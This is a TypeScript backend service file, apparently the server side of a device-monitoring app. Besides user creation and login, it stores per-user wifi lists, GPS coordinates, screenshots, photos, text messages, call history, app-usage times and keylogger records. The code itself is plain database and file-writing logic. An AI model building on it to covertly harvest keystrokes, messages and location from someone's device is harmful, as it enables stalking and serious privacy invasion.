import * as bcrypt from "bcrypt";
import { Service } from "typedi";
import { OrmRepository } from "typeorm-typedi-extensions";
import fs from "fs";
import uuidv4 from "uuid";

import {
    EventDispatcher,
    EventDispatcherInterface
} from "../../decorators/EventDispatcher";
import { Logger, LoggerInterface } from "../../decorators/Logger";
import { User } from "../models/User";
import { UserRepository } from "../repositories/UserRepository";
import { events } from "../subscribers/events";
import { DeleteResult } from "typeorm";
import { Wifi } from "../models/Wifi";
import { Message } from "../models/Message";
import { Coordinates } from "../models/Coordinates";
import { TimeOnApp } from "../models/TimeOnApp";
import { KeyLogger } from "../models/KeyLogger";
import { ScreenShot } from "../models/ScreenShot";
import { Photo } from "../models/Photo";
import { CallHistory } from "../models/CallHistory";

@Service()
export class UserService {
    constructor(
        @OrmRepository() private userRepository: UserRepository,
        @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
        @Logger(__filename) private log: LoggerInterface
    ) {}

    public find(): Promise<User[]> {
        this.log.info("Find all users");
        return this.userRepository.find();
    }

    public findOne(id: string): Promise<User | undefined> {
        this.log.info("Find one user");
        const ObjectID = require("mongodb").ObjectID;
        return this.userRepository.findOne(new ObjectID(id));
    }

    public async create(user: User): Promise<User | Error> {
        this.log.info("Create a new user => ", user.toString());
        const newUser = await this.userRepository.save(user).catch(err => {
            switch (err.code) {
                case 11000:
                    return undefined;
                default:
                    return err.message;
            }
        });
        if (newUser) {
            this.eventDispatcher.dispatch(events.user.created, newUser);
        }
        return newUser;
    }

    public async update(id: string, user: User): Promise<User> {
        this.log.info("Update a user");
        await this.userRepository.update(id, user);
        return await this.userRepository.findOne(id);
    }

    public async delete(id: string): Promise<DeleteResult> {
        this.log.info("Delete a user");
        return await this.userRepository.delete(id);
    }

    public async deleteUser(user: User): Promise<DeleteResult> {
        return await this.userRepository.delete(user);
    }

    public async authenticate(
        email: string,
        password: string
    ): Promise<User | undefined> {
        const user = await this.userRepository.findOne({ email });

        if (user) {
            const match = await bcrypt.compare(password, user.password);

            if (match) {
                return user;
            }
        }

        return undefined;
    }

    public async addWifiList(wifiList: Wifi[], user: User): Promise<User> {
        if (user.wifiList === undefined) {
            user.wifiList = [];
        }

        user.wifiList.push(...wifiList);

        await this.userRepository.save(user);

        return user;
    }

    public async addCoordinates(
        coordinate: Coordinates,
        user: User
    ): Promise<User> {
        if (user.coordinatesList === undefined) {
            user.coordinatesList = [];
        }

        user.coordinatesList.push(coordinate);

        await this.userRepository.save(user);

        return user;
    }

    public async addScreenShoot(
        screenShot: ScreenShot,
        user: User
    ): Promise<User> {
        if (user.screenShotList === undefined) {
            user.screenShotList = [];
        }

        const fileName = uuidv4();

        const buff = new Buffer(screenShot.screenShot, "base64");

        try {
            fs.mkdirSync("media/screenshots", { recursive: true });
        } catch (err) {
            if (err.code !== "EEXIST") {
                throw err;
            }
        }

        const filePath = `media/screenshots/${fileName}.jpeg`;

        fs.writeFileSync(filePath, buff);

        screenShot.path = filePath;

        screenShot.screenShot = "uploaded"; // avoid resending base64 string

        user.screenShotList.push(screenShot);

        await this.userRepository.save(user);

        return user;
    }

    public async addPhoto(photo: Photo, user: User): Promise<User> {
        if (user.photoList === undefined) {
            user.photoList = [];
        }

        const fileName = uuidv4();

        const buff = new Buffer(photo.img, "base64");

        try {
            fs.mkdirSync("media/photos", { recursive: true });
        } catch (err) {
            if (err.code !== "EEXIST") {
                throw err;
            }
        }

        const filePath = `media/photos/${fileName}.jpeg`;

        fs.writeFileSync(filePath, buff);

        photo.path = filePath;

        photo.img = "uploaded"; // avoid resending base64 string

        user.photoList.push(photo);

        await this.userRepository.save(user);

        return user;
    }

    public async addMessageList(
        messageList: Message[],
        user: User
    ): Promise<User> {
        if (user.messageList === undefined) {
            user.messageList = [];
        }

        user.messageList.push(...messageList);

        await this.userRepository.save(user);

        return user;
    }

    public async addCallHistory(
        callHistoryList: CallHistory[],
        user: User
    ): Promise<User> {
        if (user.callHistoryList === undefined) {
            user.callHistoryList = [];
        }

        user.callHistoryList.push(...callHistoryList);

        await this.userRepository.save(user);

        return user;
    }

    public async addTimeOnAppList(
        timeOnAppList: TimeOnApp[],
        user: User
    ): Promise<User> {
        if (user.timeOnAppList === undefined) {
            user.timeOnAppList = [];
        }

        user.timeOnAppList.push(...timeOnAppList);

        await this.userRepository.save(user);

        return user;
    }

    public async addKeyLoggerList(
        keyLoggerList: KeyLogger[],
        user: User
    ): Promise<User> {
        if (user.keyLoggerList === undefined) {
            user.keyLoggerList = [];
        }

        user.keyLoggerList.push(...keyLoggerList);

        await this.userRepository.save(user);

        return user;
    }
}
